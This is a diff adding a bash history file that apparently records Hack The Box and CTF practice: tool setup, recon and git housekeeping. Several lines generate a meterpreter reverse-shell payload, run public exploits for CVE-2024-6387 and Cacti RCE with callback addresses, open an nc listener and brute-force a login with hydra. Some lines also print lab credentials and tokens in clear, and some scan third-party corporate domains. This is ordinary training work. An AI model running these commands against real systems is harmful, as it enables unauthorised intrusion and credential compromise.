@@ -1,0 +1,1000 @@
+  311  curl https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > microsoft.gpg
+  312  sudo mv microsoft.gpg /etc/apt/trusted.gpg.d/microsoft.gpg
+  313  ls
+  314  echo "deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main" | sudo tee /etc/apt/sources.list.d/vscode.list
+  315  sudo apt update
+  316  sudo apt install code
+  317  mysql
+  318  mysql -u robin -probin -h 10.129.41.68
+  319  mysql -u robin -h 10.129.41.68
+  320  mysql help
+  321  sudo apt-get install mysql-server -y
+  322  sudo apt install mysql-server -y
+  323  sudo apt instlal mariadb
+  324  sudo apt install mariadb
+  325  mysql -u robin -h 10.129.41.68 -v
+  326  mysql -h 10.129.41.68
+  327  cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
+  328  apt install mysql-server -y
+  329  sudo apt install mysql-server -y
+  330  sudo apt upgrade
+  331  locate odat.py
+  332  git clone https://github.com/quentinhardy/odat.git
+  333  cd odat
+  334  pip3 install
+  335  pip3 install --break-system-packages
+  336  pip3 install --break-system-packages -r requirements.txt
+  337  ls
+  338  pwd
+  339  vim README.md
+  340  ls
+  341  sudo pip3 install
+  342  sudo pip3 install --break-system-packages
+  343  sudo pip3 install --break-system-packages -r requirements.txt
+  344  ls /usr/share/laudanum/aspx/shell.aspx 
+  345  ls
+  346  cd htb
+  347  ls
+  348  cd code-scrape
+  349  ls
+  350  mkdir tools
+  351  mkdir notes
+  352  mkdir docs
+  353  mv *.md notes
+  354  ls
+  355  mv auto-scrape.js htb-scrape.js tools
+  356  ls
+  357  cd docs
+  358  ls
+  359  cd ../notes
+  360  ls
+  361  ls A*
+  362  rm Attacking*
+  363  ls
+  364  ls A*
+  365  ls
+  366  mv Att* notes
+  367  ls
+  368  pwd
+  369  cd ..
+  370  ls
+  371  mv Att* notes
+  372  ls
+  373  git status
+  374  git add *
+  375  git status
+  376  git commit -m "attack"
+  377  git status
+  378  git push
+  379  git status
+  380  gls
+  381  ls
+  382  cd notes
+  383  ls
+  384  ls Lin*
+  385  git status
+  386  git add * && git commit -m "linux priv esc" && git push
+  387  git status
+  388  clear
+  389  cd ..
+  390  ls
+  391  cd ..
+  392  ls
+  393  mkdir notes-manual
+  394  mv module* notes-manual/
+  395  ls
+  396  mv aa_quick_notes.md notes-manual/
+  397  ls
+  398  git status
+  399  git add *
+  400  git status
+  401  git add -u
+  402  ls
+  403  git status
+  404  git commit -m "org"
+  405  git status
+  406  git push
+  407  ls
+  408  wget -O - https://raw.githubusercontent.com/freelabz/secator/main/scripts/install.sh | sh
+  409  Feel free to request new tools to be added by opening an issue, but please check that the tool complies with our selection criterias before doing so. If it doesn't but you still want to integrate it into secator, you can plug it in (see the dev guide).
+  410  InstallationFeel free to request new tools to be added by opening an issue, but please check that the tool complies with our selection criterias before doing so. If it doesn't but you still want to integrate it into secator, you can plug it in (see the dev guide).
+  411  InstallationFeel free to request new tools to be added by opening an issue, but please check that the tool complies with our selection criterias before doing so. If it doesn't but you still want to integrate it into secator, you can plug it in (see the dev guide).
+  412  dig academy.hackthebox.com
+  413  code race.c
+  414  vim race.c
+  415  gcc race.c
+  416  ls
+  417  gcc -o race race.c
+  418  ls
+  419  python3 -m http.server
+  420  ls
+  421  cd htb
+  422  ls
+  423  cd code-scrape/
+  424  ls
+  425  mv notes ../notes
+  426  git status
+  427  git add *
+  428  git status
+  429  git add ../notes/
+  430  git status
+  431  git commit -m "mv notes"
+  432  git status
+  433  ls
+  434  mkdir machines
+  435  cd machines
+  436  mkdir skyfall
+  437  sudo vim notes.md
+  438  ls
+  439  ls skyfall/
+  440  sudo vim notes.md
+  441  sudo vim skyfall/notes.md
+  442  ls
+  443  git status
+  444  ls
+  445  git add ./
+  446  git status
+  447  git commit -m "notes del"
+  448  git status
+  449  git commit -a
+  450  git status
+  451  sudo vim /etc/hosts
+  452  sudo apt search vault
+  453  sudo apt install vault
+  454  wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
+  455  echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
+  456  sudo apt update && sudo apt install vault
+  457  ps aux | grep clipboard
+  458  clipman &
+  459  sudo apt search clipman
+  460  sudo apt install clipman
+  461  clipman &
+  462  xclip -o
+  463  pluma
+  464  ls
+  465  cd ..
+  466  ls
+  467  mv machines ../machines
+  468  cd ..
+  469  ls
+  470  git status
+  471  git add machines/
+  472  git status
+  473  git add *
+  474  git status
+  475  git commit -m "machines dir loc"
+  476  git push
+  477  git pull
+  478  git status
+  479  git push
+  480  ls
+  481  cd machines
+  482  ls
+  483  sudo pluma skyfall/notes.md 
+  484  sudo pluma skyfall/notes.md &
+  485  curl https://dl.min.io/client/mc/release/linux-amd64/mc   --create-dirs   -o $HOME/minio-binaries/mc
+  486  chmod +x $HOME/minio-binaries/mc
+  487  export PATH=$PATH:$HOME/minio-binaries/
+  488  mc --help
+  489  export MINIO_ROOT_USER=5GrE1B2YGGyZzNHHZaIww
+  490  export MINIO_ROOT_PASSWORD=GkpjkmiVmpFuL2d3oRx0
+  491  env
+  492  ./mc alias set myminio http://prd23-s3-backend.skyfall.htb $MINIO_ROOT_USER $MINIO_ROOT_PASSWORD
+  493  ls
+  494  mc
+  495  mc alias set myminio http://prd23-s3-backend.skyfall.htb $MINIO_ROOT_USER $MINIO_ROOT_PASSWORD
+  496  cat /etc/hostsA
+  497  sudo vim /etc/hosts
+  498  mc alias set myminio http://prd23-s3-backend.skyfall.htb $MINIO_ROOT_USER $MINIO_ROOT_PASSWORD
+  499  sudo vim /etc/hosts
+  500  mc alias set myminio http://prd23-s3-backend.skyfall.htb $MINIO_ROOT_USER $MINIO_ROOT_PASSWORD
+  501  sudo vim /etc/hosts
+  502  echo $MINIO_ROOT_USER
+  503  echo $MINIO_ROOT_PASSWORD 
+  504  export MINIO_ROOT_USER=5GrE1B2YGGyZzNHZaIww
+  505  mc alias set myminio http://prd23-s3-backend.skyfall.htb $MINIO_ROOT_USER $MINIO_ROOT_PASSWORD
+  506  mc ls --recursive myminio
+  507  export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
+  508  export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
+  509  sudo vim etc/hosts
+  510  sudo vim /etc/hosts
+  511  vault status
+  512  sudo apt install vault
+  513  wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
+  514  echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
+  515  sudo apt update && sudo apt install vault
+  516  vault
+  517  which vault
+  518  locate vault
+  519  wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
+  520  echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
+  521  sudo apt update && sudo apt install vault
+  522  ls /etc/apt/sources.list.d/hashicorp.list
+  523  cat /etc/apt/sources.list.d/hashicorp.list
+  524  sudo apt update
+  525  sudo apt install vault
+  526  cat /etc/apt/sources.list.d
+  527  ls /etc/apt/sources.list.d
+  528  cat *
+  529  cat /etc/apt/sources.list.d/*
+  530  cat /etc/apt/sources.list.d/hashicorp.list
+  531  echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
+  532  cat /etc/apt/sources.list.d/hashicorp.list
+  533  sudo apt update
+  534  sudo apt search vault
+  535  sudo apt install vault
+  536  sudo yum install -y yum-utils shadow-utils
+  537  sudo yum-config-manager --add-repo https://rpm.releases.hashicorp.com/AmazonLinux/hashicorp.repo
+  538  sudo yum -y install vault
+  539  sudo apt search yum
+  540  sudo apt install yum
+  541  wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
+  542  echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
+  543  sudo apt update && sudo apt install vault
+  544  apt
+  545  sudo apt-get clean
+  546  sudo apt-get update
+  547  sudo apt-get install vault
+  548  lsb_release -c
+  549  history
+  550  ls /etc/apt
+  551  cd keyrings
+  552  ls /etc/apt/sources.list.d
+  553  cat /etc/apt/sources.list.d/hashicorp.list
+  554  lsb_release -c
+  555  cat /etc/os-release
+  556  sudo vim /etc/apt/sources.list.d/hashicorp.list
+  557  sudo apt update
+  558  curl -fsSL https://apt.releases.hashicorp.com/gpg | gpg --dearmor | sudo tee /usr/share/keyrings/hashicorp-archive-keyring.gpg
+  559  sudo apt update
+  560  sudo apt upgrade
+  561  sudo apt search vault
+  562  sudo apt install vault
+  563  vault status
+  564  echo $VAULT_*
+  565  echo $VAULT_API_ADDR
+  566  export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
+  567  export VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
+  568  history
+  569  vault
+  570  vault status
+  571  vault list ssh/roles
+  572  ifconfig | grep inet
+  573  sudo apt search ifconfig
+  574  ipconfig
+  575  ip addr
+  576  vault write ssh/creds/dev_otp_key_role ip=10.10.14.170 username=askyy
+  577  ssh askyy@skyfall.htb
+  578  sudo vim /etc/hosts
+  579  ssh askyy@10.10.11.254
+  580  vault write ssh/creds/dev_otp_key_role ip=10.10.11.254 username=askyy
+  581  ssh askyy@10.10.11.254
+  582  ls
+  583  git clone https://github.com/adriyansyah-mf/CVE-2024-6387-Exploiter.git
+  584  cd CVE-2024-6387-Exploiter/
+  585  ls
+  586  cat README.md
+  587  clear
+  588  ip add
+  589  ip a
+  590  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.5.46 LPORT=9999 -f c
+  591  clear
+  592  ip address
+  593  gcc -shared -o exploit.so -fPIC 7etsuo-regreSSHion.c
+  594  python3 CVE-2024-6387.py -s 192.168.5.1/24 --p 22 -t 5 -o json -f result.json
+  595  python3 CVE-2024-6387.py -s 192.168.5.1/24 --p 22 -o json -f result.json
+  596  ip addr
+  597  ipconfig
+  598  sudo apt install ifconfig
+  599  apt search net-tools
+  600  which ifconfig
+  601  dpkg -L net-tools | grep ifconfig
+  602  echo $PATH
+  603  vim .bashrc
+  604  ls
+  605  ls -lah
+  606  ls
+  607  python3 CVE-2024-6387.py -s 192.168.5.0/24 --p 22 -t 5 -o json -f result.json
+  608  nmap 192.168.5.0/24 -sV -sC
+  609  msfconsole -q
+  610  ls
+  611  history
+  612  python3 CVE-2024-6387.py -s 192.168.5.0/24 --p 22 -t 5 -o json -f result.json
+  613  python3 CVE-2024-6387.py -s $RHOSTS --p 22 -t 5 -o json -f result.json
+  614  python3 CVE-2024-6387.py -s 10.10.11.30 --p 22 -t 5 -o json -f result.json
+  615  cat result.json
+  616  python3 CVE-2024-6387.py -e 10.10.11.30 --p 22 -t 5 -o json -f result.json
+  617  python3 CVE-2024-6387.py -e 10.10.11.30 --p 22 -o json -f result.json
+  618  ping 10.10.11.30
+  619  python3 CVE-2024-6387.py -e 10.10.11.30 --p 22 -o json -f result.json
+  620  ifconfig
+  621  sbin/ifconfig
+  622  /sbin/ifconfig
+  623  nmap 192.168.5.0/24 -sV -X file.xml
+  624  nmap  -sV -oX file.xml
+  625  cat file.xml
+  626  code file.xml
+  627  searchsploit
+  628  searchsploit --nmap file.xml -v
+  629  nmap 192.168.5.0/24 -sC -sV -X file.xml
+  630  nmap 192.168.5.0/24 -sC -sV -oX file.xml
+  631  nmap 192.168.5.0/24 -sC -sV -O -A -oX file.xml
+  632  sudo nmap 192.168.5.0/24 -sC -sV -O -A -oX file.xml
+  633  searchsploit --nmap file.xml -v
+  634  nmap --help
+  635  sudo nmap 192.168.5.0/24 -sC -sV -O -A -o file.xml
+  636  sudo nmap 192.168.5.0/24 -sC -sV -O -oA -oS
+  637  sudo nmap 192.168.5.0/24 -sC -sV -O -oS
+  638  sudo nmap 192.168.5.0/24 -sC -sV -O -oS sk
+  639  ls
+  640  ls -la sk
+  641  file sk
+  642  vim sk
+  643  rm sk
+  644  sudo nmap 192.168.5.0/24 -sC -sV -O -oA 
+  645  sudo nmap 192.168.5.0/24 -sC -sV -O -oA scan
+  646  sudo msfconsole -q
+  647  ls
+  648  code CVE-2024-6387-Exploiter/
+  649  sudo code CVE-2024-6387-Exploiter/
+  650  sudo code CVE-2024-6387-Exploiter/
+  651  code CVE-2024-6387-Exploiter/
+  652  export PATH=$PATH:/sbin
+  653  ifconfig
+  654  searchsploit
+  655  searchsploit irobot
+  656  cd htb/tools
+  657  ls
+  658  sudo vim lb_nmap.sh 
+  659  ls
+  660  ls lb_nmap.sh 
+  661  sudo vim lb_nmap.sh 
+  662  rm ~/.local/share/nvim/swap//%home%loganbek%htb
+  663  %tools%lb_nmap.sh.swp
+  664  cd /home/loganbek/.local/share/nvim/swap/
+  665  ls'
+  666  ;
+  667  '
+  668  ls
+  669  ls -lah
+  670  cd -
+  671  sudo vim lb_nmap.sh 
+  672  rm /roo
+  673  t/.local/share/nvim/swap//%home%loganbek%htb%tools%lb_n
+  674  map.sh.swp
+  675  sudo rm /root/.local/share/nvim/swap//%home%loganbek%htb%tools%lb_nmap.sh.swp
+  676  sudo vim lb_nmap.sh 
+  677  git status
+  678  git add *
+  679  git commit -m "all output types"
+  680  git push
+  681  ls
+  682  cp lb_nmap.sh ~/lb_nmap.sh
+  683  cd ~
+  684  ./lb_nmap.sh 0 10.10.11.30
+  685  ./lb_nmap.sh 1 10.10.11.30
+  686  sudo ./lb_nmap.sh 1 10.10.11.30
+  687  ssh askyy@10.10.11.254
+  688  history
+  689  export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG"
+  690  sudo apt update
+  691  sudo apt install net-tools
+  692  ifconfig
+  693  ipconfig
+  694  nmap -sV -sC 10.10.11.30
+  695  export RHOSTS=10.10.11.30
+  696  clear
+  697  ls
+  698  msfconsole -q
+  699  nmap 10.10.11.30 -sV -sC -oX m3scan
+  700  sudo nmap 10.10.11.30 -vvv -p- -sV -sC -O -A -oX m3scan
+  701  msfconsole -q
+  702  ls
+  703  git clone https://github.com/thisisveryfunny/CVE-2024-25641-RCE-Automated-Exploit
+  704  git clone https://github.com/thisisveryfunny/CVE-2024-25641-RCE-Automated-Exploit-Cacti-1.2.26
+  705  cd CVE-2024-25641-RCE-Automated-Exploit-Cacti-1.2.26/
+  706  ls
+  707  pip install -r requirements.txt 
+  708  pip install -r requirements.txt --break-system-packages
+  709  python3 exploit.py -L 10.10.14.170 -lp 1234 -wp 8000 -url cacti.monitorsthree.htb/cacti
+  710  python3 exploit.py -L 10.10.14.170 -lp 1234 -wp 8000 -url https://cacti.monitorsthree.htb/cacti
+  711  python3 exploit.py -L 10.10.14.170 -lp 1234 -wp 8000 -url https://cacti.monitorsthree.htb/cacti/index.php
+  712  python3 exploit.py -L 10.10.14.170 -lp 1234 -wp 8000 -url https://cacti.monitorsthree.htb/cacti/index.php -u admin -p admin123
+  713  ls /usr/share/metasploit-framework/config/
+  714  cat /usr/share/metasploit-framework/config/*
+  715  clear
+  716  history
+  717  wappalyzer
+  718  sudo apt search wappalyzer
+  719  npm install -g wappalyzer
+  720  sudo npm install -g wappalyzer
+  721  wappalyzer
+  722  gh repo clone gokulapap/wappalyzer-cli
+  723  cd wappalyzer-cli/
+  724  ls
+  725  pop install -r requirements.txt 
+  726  pip install -r requirements.txt 
+  727  pip install -r requirements.txt --break-system-packages
+  728  wappy
+  729  pip3 install -r requirements.txt 
+  730  pip3 install -r requirements.txt  --breao-system-packages
+  731  pip3 install -r requirements.txt  --break-system-packages
+  732  wappy
+  733  locate wappy
+  734  which wappy
+  735  wappy -h
+  736  git clone http://github.com/brandonscholet/python-Wappalyzer.git 
+  737  cd python-Wappalyzer/
+  738  ls
+  739  sudo python3 setup.py install
+  740  wappy
+  741  ls
+  742  Wappalyzer
+  743  cd ..
+  744  gobuster vhost -u monitorsthree.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --append-domain
+  745  gobuster vhost -u monitorsthree.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --append-domain
+  746  gobuster vhost -u monitorsthree.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --append-domain
+  747  gobuster vhost -u monitorsthree.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --append-domain-t 50
+  748  gobuster vhost -u monitorsthree.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --append-domain -t 50
+  749  gobuster vhost -u cacti.monitorsthree.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --append-domain -t 50
+  750  gobuster dir -u monitorsthree.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50 -r
+  751  gobuster dir -u monitorsthree.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -r
+  752  gobuster dir -u monitorsthree.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -r
+  753  gobuster dir -u cacti.monitorsthree.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -r
+  754  gobuster dir -u cacti.monitorsthree.htb/app -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -r
+  755  gobuster dir -u cacti.monitorsthree.htb/cacti -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -r
+  756  ls
+  757  cd htb/tools
+  758  sudo vim lb_nmap.sh 
+  759  code lb_nmap.sh 
+  760  cp --help
+  761  cp lb_nmap.sh ~/lb_nmap.sh 
+  762  cat ~/lb_nmap.sh 
+  763  code lb_nmap.sh 
+  764  git status
+  765  git add *
+  766  git help
+  767  git diff --staged
+  768  git status
+  769  git commit -m "add all scan"
+  770  git push
+  771  cp lb_nmap.sh ~/lb_nmap.sh 
+  772  cd ~
+  773  ls
+  774  mkdir monitorsThree
+  775  cd monitorsThree/
+  776  sudo .././lb_nmap.sh 10.10.11.30
+  777  sudo .././lb_nmap.sh 4 10.10.11.30
+  778  nc -lvnp 1234
+  779  sudo nmap varonis.com -vvv -A -p- -sV -sC -oA varonis-scan
+  780  history
+  781  ls
+  782  cat varonis scan gnm
+  783  cat varonis-scan.gnmap
+  784  clear
+  785  cat varonis-scan.xml
+  786  code varonis-scan.xml
+  787  strings varonis-scan.xml
+  788  ls
+  789  cd ~
+  790  ls
+  791  cd monitorsThree/
+  792  ls
+  793  code * .xml
+  794  code *.xml
+  795  code *monitorsthree*.md
+  796  msfconsole -q
+  797  git status
+  798  git remote -v
+  799  python -m http.server
+  800  ls
+  801  cd monitorsThree/
+  802  ls
+  803  cd ~/htb/tools
+  804  ls
+  805  code lb_fuzz.sh
+  806  chmod +x lb_fuzz.sh
+  807  ls
+  808  git status
+  809  git add *
+  810  git commit -m "lb fuzz"
+  811  git push
+  812  cd ~/monitorsThree/
+  813  ls
+  814  sudo ../htb/tools/./lb_fuzz.sh 0 10.10.11.30 
+  815  sudo ../htb/tools/./lb_fuzz.sh 0 10.10.11.30
+  816  code ../htb/tools/lb_fuzz.sh 
+  817  sudo ../htb/tools/./lb_fuzz.sh 0 10.10.11.30
+  818  sudo ../htb/tools/./lb_fuzz2.sh 0 10.10.11.30
+  819  chmod +x ../htb/tools/lb_fuzz2.sh
+  820  sudo ../htb/tools/./lb_fuzz2.sh 0 10.10.11.30
+  821  fuff --help
+  822  ffuf --help
+  823  clear
+  824  ls
+  825  locate seclists
+  826  which seclists
+  827  find seclists
+  828  find / seclists
+  829  locate wordlist
+  830  sudo apt search seclists
+  831  sudo apt install seclists
+  832  ls /opt
+  833  ls /usr/share
+  834  ffuf -u monitorsthree.htb -H "Host: FUZZ.monitorsthree.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o fuzz_monitorsthree.htb -of all
+  835  ls
+  836  cat fuzz *
+  837  cat fuzz*
+  838  clear
+  839  cat fuzz*
+  840  ffuf -u monitorsthree.htb -H "Host: FUZZ.monitorsthree.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o fuzz_monitorsthree.htb -of all
+  841  ffuf -u monitorsthree.htb -H "Host: FUZZ.monitorsthree.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o vhost_monitorsthree.htb -of all
+  842  rm fuzz*
+  843  ls
+  844  ffuf -u monitorsthree.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -o fuzz_monitorsthree -of all
+  845  ls /usr/share/wordlists/seclists/Discovery/Web-Content/
+  846  ffuf -u monitorsthree.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -o fuzz_monitorsthree -of all
+  847  gobuster vhost -u mointorsThree.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-11000.txt
+  848  gobuster vhost -u mointorsThree.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
+  849  gobuster vhost -u montorsThree.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
+  850  gobuster vhost -u monitorsThree.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
+  851  gobuster vhost -u monitorsthree.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
+  852  gobuster vhost -u 10.10.11.30 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
+  853  sudo vim /etc/hosts
+  854  clear
+  855  ffuf -u http://cacti.monitorsthree.htb/cacti/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion
+  856  ffuf --help
+  857  ffuf -u http://cacti.monitorsthree.htb/cacti/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -ic -v
+  858  clear
+  859  ffuf -u http://cacti.monitorsthree.htb/cacti/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -ic -v
+  860  history
+  861  ls
+  862  msfconsole -q
+  863  searchsploit --help
+  864  ls
+  865  cd monitorsThree/
+  866  ls
+  867  searchsploit --nmap balanced_scan_10.10.11.30.xml -v
+  868  msfconsole updaet
+  869  hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt http-post-form "http://cacti.monitorsthree.htb/cacti/index.php:login_username=^USER^&login_password=^PASS^&action=login:Access Denied! Login failed." -V
+  870  hydra --help
+  871  hydra help
+  872  hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt http-post-form "http://cacti.monitorsthree.htb/cacti/index.php:login_username=^USER^&login_password=^PASS^&action=login:Access Denied! Login failed." -V
+  873  hydra -l admin -P /path/to/passwordlist.txt http-post-form "http://cacti.monitorsthree.htb/cacti/index.php:login_username=^USER^&login_password=^PASS^&action=login:loginErrors" -V
+  874  hydra -l admin -P /path/to/passwordlist.txt http-post-form "http://cacti.monitorsthree.htb/cacti/index.php:login_username=^USER^&login_password=^PASS^&action=login:F=loginErrors:H=Cookie"
+  875  cat ~/htb/notes/*.md | grep hydra
+  876  hydra -l admin -P /path/to/passwordlist.txt http://cacti.monitorsthree.htb/cacti http-post-form "/index.php:login_username=^USER^&login_password=^PASS^&action=login:F=loginErrors:H=Cookie"
+  877  hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt http://cacti.monitorsthree.htb/cacti http-post-form "/index.php:login_username=^USER^&login_password=^PASS^&action=login:F=loginErrors:H=Cookie"
+  878  hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt http-post-form "http://cacti.monitorsthree.htb/cacti/index.php:login_username=^USER^&login_password=^PASS^&action=login:F=loginErrors" -V
+  879  hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt http-post-form "http://cacti.monitorsthree.htb/cacti/index.php:login_username=^USER^&login_password=^PASS^&action=login:loginErrors" -V
+  880  hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt http-post-form "http://cacti.monitorsthree.htb/cacti/index.php:login_username=^USER^&login_password=^PASS^&action=login:loginErrors" -V -debug
+  881  hydra | grep debug
+  882  hydra help | grep debug
+  883  hydra -h | grep debug
+  884  hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt http-post-form "http://cacti.monitorsthree.htb/cacti/index.php:login_username=^USER^&login_password=^PASS^&action=login:loginErrors" -V -d
+  885  hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt http-post-form "http://cacti.monitorsthree.htb/cacti/index.php:login_username=^USER^&login_password=^PASS^&action=login:loginErrors" -V
+  886  curl -X POST -d "login_username=test&login_password=test&action=login" http://cacti.monitorsthree.htb/cacti/index.php
+  887  hydra -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt http-post-form "http://cacti.monitorsthree.htb/cacti/index.php:login_username=^USER^&login_password=^PASS^&action=login:loginErrors" -d -V
+  888  wpscan
+  889  wpscan --update
+  890  wpscan --url https://4xura.com/ctf/htb/htb-writeup-monitorsthree/
+  891  wpscan --url 4xura.com/ctf/htb/htb-writeup-monitorsthree
+  892  wpscan --url 4xura.com/ctf/htb/htb-writeup-monitorsthree/
+  893  wpscan --url 4xura.com
+  894  https://wpscan.com/register
+  895  cat ~/htb/notes/*.md | grep wpscan
+  896  cd ~/Downloads
+  897  sudo openvpn lab_lbek.ovpn 
+  898  cd ~/Downloads
+  899  ls
+  900  sudo openvpn lab_lbek.ovpn 
+  901  cd ~/Downloads
+  902  sudo openvpn lab_lbek.ovpn& 
+  903  jobs
+  904  ps a
+  905  ifconfig
+  906  ip add
+  907  ip addr
+  908  ps -a
+  909  ps -au
+  910  ps -aux
+  911  ps -aux | grep openvpn
+  912  kill -9 7273
+  913  kill -9 7276
+  914  kill -9 7277
+  915  ps -aux | grep openvpn
+  916  ip addr
+  917  ls
+  918  msfconsole -q
+  919  ls
+  920  mkdir expedia
+  921  cd expedia
+  922  ls
+  923  sudo vim hosts.txt
+  924  ls
+  925  cat ../htb/tools/lb_nmap.sh 
+  926  sudo ../htb/tools/./lb_nmap.sh 0 hosts.txt
+  927  sudo ../htb/tools/./lb_nmap.sh 2 hosts.txt
+  928  history
+  929  ls
+  930  cd expedia/
+  931  ls
+  932  searchsploit --help
+  933  searchsploit --nmap *.xml
+  934  ls
+  935  ls -la
+  936  searchsploit --nmap *.xml
+  937  seachsploit --nmap balanced_scan_www.carrentals.com.xml
+  938  searchsploit --nmap balanced_scan_www.carrentals.com.xml
+  939  searchsploit 
+  940  searchsploit --nmap balanced_scan_www.carrentals.com.xml -v
+  941  searchsploit --nmap balanced_scan*.xml -v
+  942  ls
+  943  for file in *.xml; do searchsploit --nmap -v "$file"; done
+  944  hosts
+  945  msfconsole -q
+  946  ls
+  947  clear
+  948  history
+  949  ls /
+  950  ls /usr
+  951  ls /usr/share
+  952  clear
+  953  gobuster
+  954  ffuf -u https://9ffafb29e55d2c3632939cdc20e6b6dc.ctf.hacker101.com/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -ic -v -o h101ctf_fuzz -of all
+  955  ffuf -u https://9ffafb29e55d2c3632939cdc20e6b6dc.ctf.hacker101.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -ic -v -o h101ctf_fuzz -of all
+  956  gobuster vhost -u https://9ffafb29e55d2c3632939cdc20e6b6dc.ctf.hacker101.com/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --append-domain -t 50
+  957  gobuster vhost -u https://9ffafb29e55d2c3632939cdc20e6b6dc.ctf.hacker101.com/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --append-domain -t 10
+  958  sqlmap --wizard
+  959  ip addr
+  960  ping google.com
+  961  cat ctf-login-req.txt 
+  962  curl 94.237.58.173:48496
+  963  curl -v 94.237.58.173:48496
